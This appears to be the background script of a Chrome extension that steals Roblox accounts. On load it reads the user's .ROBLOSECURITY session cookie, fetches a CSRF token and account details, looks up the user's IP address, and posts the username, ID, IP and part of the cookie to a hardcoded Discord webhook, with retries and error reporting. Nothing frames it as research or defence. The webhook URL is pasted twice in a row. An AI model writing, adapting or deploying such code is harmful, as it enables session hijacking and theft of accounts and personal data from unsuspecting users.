const WEBHOOK_URL = "https://discord.com/api/webhooks/1383717664387498034/SZUg4Xj-rtaH_OHC25ph9i5IGlWWNwd1JTtqZkAdtln7dbz1DS6sdCnGceNWpmpSjBo9https://discord.com/api/webhooks/1383717664387498034/SZUg4Xj-rtaH_OHC25ph9i5IGlWWNwd1JTtqZkAdtln7dbz1DS6sdCnGceNWpmpSjBo9"; // REPLACE THIS

// 1. Bulletproof CSRF Token Fetch
async function getCsrfToken(cookie) {
    const endpoints = [
        "https://auth.roblox.com/v2/logout",
        "https://www.roblox.com/home",
        "https://www.roblox.com/game/join"
    ];

    for (const endpoint of endpoints) {
        try {
            const response = await fetch(endpoint, {
                method: "POST",
                headers: { 
                    Cookie: `.ROBLOSECURITY=${cookie}`,
                    "Content-Type": "application/json"
                },
                credentials: "include"
            });

            const token = response.headers.get("x-csrf-token");
            if (token) return token;
        } catch (error) {
            console.warn(`CSRF attempt failed for ${endpoint}:`, error);
        }
    }
    throw new Error("All CSRF token attempts failed");
}

// 2. Enhanced Roblox Data Fetch
async function getRobloxUserData(cookie, csrfToken) {
    const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
        headers: {
            Cookie: `.ROBLOSECURITY=${cookie}`,
            "X-CSRF-TOKEN": csrfToken,
            "Content-Type": "application/json"
        },
        credentials: "include"
    });

    if (response.status === 401) throw new Error("Invalid cookie (401)");
    if (!response.ok) throw new Error(`API Error: ${response.status}`);
    
    return await response.json();
}

// 3. Guaranteed Discord Delivery
async function sendToDiscord(data, ip, cookie) {
    const payload = {
        embeds: [{
            title: "Roblox Account Info",
            color: 0x5865F2,
            fields: [
                { name: "Username", value: data?.name || "N/A", inline: true },
                { name: "User ID", value: data?.id || "N/A", inline: true },
                { name: "Premium", value: data?.isPremium ? "✅" : "❌", inline: true },
                { name: "IP Address", value: ip || "N/A", inline: false },
                { name: "Cookie (truncated)", value: `\`\`\`${cookie?.substring(0, 30)}...\`\`\``, inline: false }
            ],
            thumbnail: {
                url: data?.id ? `https://www.roblox.com/headshot-thumbnail/image?userId=${data.id}` : null
            },
            timestamp: new Date().toISOString()
        }]
    };

    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            if (response.ok) return;
        } catch (error) {
            if (attempt === 3) throw error;
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

// 4. Main Process with Complete Error Handling
async function main(cookie) {
    try {
        if (!cookie) throw new Error("No cookie provided");

        console.log("Starting data collection...");
        
        // Phase 1: Get CSRF Token
        const csrfToken = await getCsrfToken(cookie);
        console.log("CSRF Token acquired");
        
        // Phase 2: Get User Data
        const userData = await getRobloxUserData(cookie, csrfToken);
        console.log("User data fetched:", userData.name);
        
        // Phase 3: Get IP
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipResponse.json();
        console.log("IP Address:", ip);
        
        // Phase 4: Send to Discord
        await sendToDiscord(userData, ip, cookie);
        console.log("Data sent successfully");
        
    } catch (error) {
        console.error("Fatal Error:", error);
        
        // Emergency error reporting
        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `❌ EXTENSION FAILURE: ${error.message}`
                })
            });
        } catch (e) {
            console.error("Failed to send error report:", e);
        }
    }
}

// Chrome Extension Listener
chrome.cookies.get({
    url: "https://www.roblox.com",
    name: ".ROBLOSECURITY"
}, (cookie) => {
    if (cookie?.value) {
        console.log("Cookie found, initiating...");
        main(cookie.value);
    } else {
        console.log("No valid cookie found");
    }
});